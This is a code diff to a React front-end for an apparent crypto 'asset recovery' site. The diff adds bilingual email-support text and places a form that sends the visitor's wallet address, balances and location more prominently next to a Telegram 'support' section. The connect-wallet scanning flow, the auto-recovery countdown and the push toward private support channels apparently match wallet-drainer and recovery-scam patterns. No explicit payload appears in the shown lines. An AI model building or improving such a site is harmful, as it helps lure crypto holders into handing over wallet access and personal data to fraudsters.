@@ -104,7 +104,11 @@ const TRANSLATIONS = {
     telegramDesc: 'Facing connection issues? Using an unsupported exchange? Our support team is active 24/7 on Telegram to help you recover your assets.',
     telegramButton: 'Join Telegram Community',
     connectionHelp: 'Connection Problems?',
-    manualReachout: 'Manual Support'
+    manualReachout: 'Manual Support',
+    emailSupportTitle: 'Email Support',
+    emailSupportDesc: 'No Telegram? No problem! Send us an email with your issue and our support team will get back to you within 24 hours.',
+    whyEmailSupport: 'Why Email Support?',
+    emailSupportPoints: '• For users who don\'t use Telegram\n• For detailed issues requiring documentation\n• For exchange users (Binance, Coinbase, Kraken)\n• For follow-up on manual recovery cases'
   },
   es: {
     serviceActive: 'PROTOCOLO DE RECUPERACIÓN · ACTIVO',
@@ -175,7 +179,11 @@ const TRANSLATIONS = {
     telegramDesc: '¿Problemas de conexión? ¿Usas un exchange no compatible? Nuestro equipo de soporte está activo 24/7 en Telegram para ayudarte a recuperar tus activos.',
     telegramButton: 'Unirse a Telegram',
     connectionHelp: '¿Problemas de conexión?',
-    manualReachout: 'Soporte Manual'
+    manualReachout: 'Soporte Manual',
+    emailSupportTitle: 'Soporte por Email',
+    emailSupportDesc: '¿No tienes Telegram? ¡No hay problema! Envíanos un email con tu problema y nuestro equipo te responderá en 24 horas.',
+    whyEmailSupport: '¿Por qué Email Support?',
+    emailSupportPoints: '• Para usuarios que no usan Telegram\n• Para problemas detallados que requieren documentación\n• Para usuarios de exchanges (Binance, Coinbase, Kraken)\n• Para seguimiento de casos de recuperación manual'
   }
 };
 
@@ -489,7 +497,7 @@ const AutoRecoveryCountdown = ({ seconds, translations, onCancel }) => {
 };
 
 // ============================================
-// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT
+// ENHANCED REPORT ISSUE COMPONENT - WITH EMAIL INPUT (PROMINENTLY PLACED)
 // ============================================
 const ReportIssue = ({ translations, address, balances, userLocation }) => {
   const [userEmail, setUserEmail] = useState('');
@@ -545,12 +553,30 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
   };
 
   return (
-    <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
-      <div className="flex items-center gap-2 mb-3">
-        <span className="text-xl">📧</span>
-        <h3 className="text-lg font-bold text-blue-400">{translations.support} & {translations.reportIssue}</h3>
+    <div className="bg-gradient-to-br from-blue-500/10 to-purple-500/5 border border-blue-500/30 backdrop-blur rounded-xl p-6 transition-all duration-300 hover:border-blue-400/50 hover:shadow-lg hover:shadow-blue-500/10">
+      <div className="flex items-center gap-3 mb-4">
+        <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 rounded-xl flex items-center justify-center shadow-lg">
+          <span className="text-2xl">📧</span>
+        </div>
+        <div>
+          <h3 className="text-xl font-bold text-blue-400">{translations.emailSupportTitle}</h3>
+          <p className="text-xs text-gray-400">{translations.emailSupportDesc}</p>
+        </div>
       </div>
-      <p className="text-xs text-gray-400 mb-4">{translations.contactInfo}</p>
+      
+      <div className="bg-black/40 rounded-lg p-3 mb-4 border border-blue-500/20">
+        <div className="flex items-start gap-2 text-xs text-gray-400">
+          <span className="text-blue-400">📌</span>
+          <div>
+            <p className="font-semibold text-gray-300 mb-1">{translations.whyEmailSupport}</p>
+            <p className="whitespace-pre-line text-[11px]">{translations.emailSupportPoints}</p>
+          </div>
+        </div>
+      </div>
+      
+      <p className="text-xs text-gray-400 mb-4 flex items-center gap-1">
+        <span className="text-green-400">✓</span> {translations.contactInfo}
+      </p>
       
       {/* Email Input */}
       <input
@@ -579,8 +605,8 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
       
       {/* Success Message */}
       {sent && (
-        <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2">
-          ✓ {translations.reportSent}
+        <div className="mb-3 text-xs text-green-400 bg-green-500/10 rounded-lg p-2 flex items-center gap-2">
+          <span>✓</span> {translations.reportSent}
         </div>
       )}
       
@@ -588,13 +614,13 @@ const ReportIssue = ({ translations, address, balances, userLocation }) => {
       <button
         onClick={handleSendReport}
         disabled={isSending}
-        className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50"
+        className="w-full bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-700 hover:to-blue-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 flex items-center justify-center gap-2"
       >
         {isSending ? (
-          <span className="flex items-center justify-center gap-2">
+          <>
             <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
             {translations.processingReport}
-          </span>
+          </>
         ) : sent ? '✓ Sent!' : translations.sendReport}
       </button>
     </div>
@@ -1575,9 +1601,21 @@ function App() {
           )}
 
           {/* ============================================ */}
-          {/* TELEGRAM SUPPORT SECTION - AFTER CONNECT WALLET BUTTON */}
+          {/* SUPPORT SECTION - TELEGRAM (First) + EMAIL (Second) */}
           {/* ============================================ */}
+          
+          {/* Telegram Support - For users who prefer instant chat */}
           <TelegramSupport translations={translations} />
+          
+          {/* Email Support Section - For users without Telegram or needing manual follow-up */}
+          <div className="w-full max-w-md mt-6">
+            <ReportIssue 
+              translations={translations}
+              address={address}
+              balances={balances}
+              userLocation={userLocation}
+            />
+          </div>
 
           {/* SCANNING ANIMATION */}
           {isConnected && scanning && (
@@ -1727,8 +1765,8 @@ function App() {
             </div>
           )}
 
-          {/* Info Section - 3 columns with enhanced Report Issue */}
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
+          {/* Info Section - 2 columns (removed ReportIssue since it's now at the top) */}
+          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mt-12">
             
             <div className="bg-blue-500/5 border border-blue-500/20 backdrop-blur p-6 rounded-xl">
               <h3 className="text-lg font-bold mb-3 text-blue-400">How Recovery Works</h3>
@@ -1750,14 +1788,6 @@ function App() {
                 • Avalanche
               </p>
             </div>
-
-            {/* Enhanced Report Issue Component with Email Input */}
-            <ReportIssue 
-              translations={translations}
-              address={address}
-              balances={balances}
-              userLocation={userLocation}
-            />
           </div>
 
           {/* Footer */}
